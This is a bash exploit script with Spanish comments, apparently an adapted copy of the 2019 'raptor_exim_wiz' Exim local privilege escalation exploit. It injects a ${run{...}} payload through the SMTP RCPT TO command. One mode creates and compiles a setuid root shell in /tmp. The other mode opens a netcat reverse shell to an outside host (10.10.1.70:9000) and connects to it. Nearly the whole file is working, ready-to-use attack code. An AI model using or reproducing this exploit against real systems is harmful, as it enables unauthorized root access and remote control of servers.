#!/bin/bash

# Variable que define el método de explotación, con valor por defecto "setuid".
METHOD="setuid"

# Payload que utiliza el método setuid para cambiar los permisos de un archivo en /tmp.
PAYLOAD_SETUID='${run{\x2fbin\x2fsh\t-c\t\x22chown\troot\t\x2ftmp\x2fpwned\x3bchmod\t4755\t\x2ftmp\x2fpwned\x22}}@localhost'

# Payload que utiliza Netcat para conectar desde la máquina objetivo a tu máquina en el puerto 9000.
PAYLOAD_NETCAT='${run{\x2fbin\x2fsh\t-c\t\x22nc\t10.10.1.70\t9000\t-e\t\x2fbin\x2fsh\x22}}@localhost'

# Función que muestra cómo utilizar el script y las opciones disponibles.
function usage()
{
  echo "$0 [-m METHOD]"  # Muestra el nombre del script seguido de las opciones disponibles.
  echo  # Línea en blanco para separación visual.
  echo "-m setuid : use the setuid payload (default)"  # Explicación del método setuid.
  echo "-m netcat : use the netcat payload"  # Explicación del método netcat.
  echo  # Otra línea en blanco.
  exit 1  # Finaliza el script con un código de salida de 1 (indicando un error o uso incorrecto).
}

# Función que ejecuta la explotación enviando el payload al servicio.
function exploit()
{
  # Establece una conexión bidireccional con el puerto 25 en localhost.
  exec 3<>/dev/tcp/10.0.100.211/25

  # Proceso de entrega del payload a través del protocolo SMTP.
  read -u 3 && echo $REPLY  # Lee la respuesta del servidor y la muestra.
  echo "helo localhost" >&3  # Envía el comando HELO al servidor SMTP.
  read -u 3 && echo $REPLY  # Lee la respuesta del servidor y la muestra.
  echo "mail from:<>" >&3  # Envía el comando MAIL FROM sin especificar un remitente.
  read -u 3 && echo $REPLY  # Lee la respuesta del servidor y la muestra.
  echo "rcpt to:<$PAYLOAD>" >&3  # Envía el comando RCPT TO con el payload como destinatario.
  read -u 3 && echo $REPLY  # Lee la respuesta del servidor y la muestra.
  echo "data" >&3  # Inicia la sección de datos del mensaje SMTP.
  read -u 3 && echo $REPLY  # Lee la respuesta del servidor y la muestra.

  # Envía múltiples líneas "Received: $i" para simular un correo válido.
  for i in {1..31}
  do
    echo "Received: $i" >&3  # Envía cada línea simulada al servidor.
  done

  # Finaliza la sección de datos del mensaje SMTP.
  echo "." >&3
  read -u 3 && echo $REPLY  # Lee la respuesta del servidor y la muestra.

  # Cierra la conexión SMTP.
  echo "quit" >&3
  read -u 3 && echo $REPLY  # Lee la respuesta final del servidor y la muestra.
}

# Muestra un banner informativo del script.
echo
echo 'raptor_exim_wiz - "The Return of the WIZard" LPE exploit'  # Nombre del exploit.
echo 'Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>'  # Autor y año de creación.
echo

# Procesa las opciones de la línea de comandos.
while [ ! -z "$1" ]; do  # Mientras haya argumentos en la línea de comandos.
  case $1 in
    -m) shift; METHOD="$1"; shift;;  # Si se especifica -m, cambia el método al indicado por el usuario.
    * ) usage  # Si el argumento no es reconocido, muestra la ayuda.
    ;;
  esac
done

# Si no se especifica ningún método, muestra la ayuda.
if [ -z $METHOD ]; then
  usage
fi

# Método setuid.
if [ $METHOD = "setuid" ]; then

  # Prepara un archivo binario con setuid para obtener permisos elevados.
  echo "Preparing setuid shell helper..."
  echo "main(){setuid(0);setgid(0);system(\"/bin/sh\");}" >/tmp/pwned.c  # Crea un código fuente en C para obtener una shell con permisos de root.
  gcc -o /tmp/pwned /tmp/pwned.c 2>/dev/null  # Compila el código C y genera el binario en /tmp.
  
  # Si la compilación falla, copia /bin/sh a /tmp/pwned como solución alternativa.
  if [ $? -ne 0 ]; then
    echo "Problems compiling setuid shell helper, check your gcc."  # Muestra un mensaje de error si falla la compilación.
    echo "Falling back to the /bin/sh method."  # Informa que usará el método alternativo.
    cp /bin/sh /tmp/pwned  # Copia /bin/sh a /tmp/pwned.
  fi
  echo

  # Selecciona y entrega el payload utilizando el método setuid.
  echo "Delivering $METHOD payload..."
  PAYLOAD=$PAYLOAD_SETUID
  exploit
  echo

  # Espera 5 segundos y ejecuta el binario creado en /tmp/pwned.
  echo "Waiting 5 seconds..."
  ls -l /tmp/pwned  # Muestra los permisos del archivo para verificar si se aplicaron correctamente.
  /tmp/pwned  # Ejecuta el archivo /tmp/pwned, obteniendo una shell.

# Método netcat.
elif [ $METHOD = "netcat" ]; then

  # Selecciona y entrega el payload utilizando el método netcat.
  echo "Delivering $METHOD payload..."
  PAYLOAD=$PAYLOAD_NETCAT
  exploit
  echo

  # Espera 5 segundos y se conecta al puerto 9000 para interactuar con la shell.
  echo "Waiting 5 seconds..."
  nc -v 10.10.1.70 9000  # Se conecta a la IP 10.10.1.70 en el puerto 9000 para recibir la reverse shell.

# Si el método especificado no es válido, muestra la ayuda.
else
  usage
fi
